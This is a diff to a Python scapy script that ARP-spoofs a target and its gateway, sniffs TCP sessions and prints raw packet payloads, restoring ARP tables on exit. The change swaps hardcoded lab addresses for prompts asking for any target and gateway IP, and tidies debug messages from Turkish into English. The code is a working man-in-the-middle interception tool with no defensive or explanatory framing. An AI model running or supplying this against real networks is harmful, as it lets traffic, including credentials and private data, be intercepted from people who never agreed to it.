@@ -3,8 +3,8 @@ import scapy.all as scapy
 import time
 
 interval = 4
-ip_target = "192.168.33.30"
-ip_gateway = "192.168.33.20"
+ip_target = input("Enter target IP address: ")
+ip_gateway = input("Enter gateway IP address: ")
 
 def spoof(target_ip, spoof_ip):
     macAddr = scapy.getmacbyip(target_ip)
@@ -21,7 +21,7 @@ try:
     while True:
         spoof(ip_target, ip_gateway)
         spoof(ip_gateway, ip_target)
-        print("capture'a geldim")
+        print("capture started") # after a few seconds you should stop it
 
         capture = sniff(session=TCPSession, iface = "eth1")
         skip = False
@@ -31,13 +31,10 @@ try:
                 continue
 
             if Raw in x:
-                print("asdasdasdasdas")
                 load = x[Raw].load
                 print("load: ", load)
 
-        print("sniff bitti")
-        #capture.show()
-
+        print("end of sniff")
         time.sleep(interval)
 except KeyboardInterrupt:
     restore(ip_gateway, ip_target)
